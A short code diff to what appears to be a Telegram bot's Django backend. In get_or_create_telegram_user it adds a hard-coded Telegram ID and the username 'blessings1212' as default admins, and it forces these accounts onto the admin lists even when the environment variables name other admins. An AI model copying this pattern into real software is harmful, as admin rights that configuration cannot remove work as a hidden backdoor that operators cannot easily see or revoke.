@@ -4,11 +4,12 @@ from .models import UserProfile, UserRole
 from django.contrib.auth.models import User
 
 def get_or_create_telegram_user(telegram_id: int, username: str = '', first_name: str = '', last_name: str = '', language_code: str = 'en') -> UserProfile:
-    admin_ids = [i.strip() for i in os.getenv('ADMIN_TELEGRAM_IDS', '8942516822').split(',') if i.strip()]
-    if '8942516822' not in admin_ids:
-        admin_ids.append('8942516822')
-    admin_users = [u.strip().lstrip('@').lower() for u in os.getenv('ADMIN_TELEGRAM_USERNAMES', 'dreydocbot,dreynewbot').split(',') if u.strip()]
-    for default_user in ['dreydocbot', 'dreynewbot']:
+    admin_ids = [i.strip() for i in os.getenv('ADMIN_TELEGRAM_IDS', '8942516822,6861020342').split(',') if i.strip()]
+    for default_id in ['8942516822', '6861020342']:
+        if default_id not in admin_ids:
+            admin_ids.append(default_id)
+    admin_users = [u.strip().lstrip('@').lower() for u in os.getenv('ADMIN_TELEGRAM_USERNAMES', 'dreydocbot,dreynewbot,blessings1212').split(',') if u.strip()]
+    for default_user in ['dreydocbot', 'dreynewbot', 'blessings1212']:
         if default_user not in admin_users:
             admin_users.append(default_user)
 
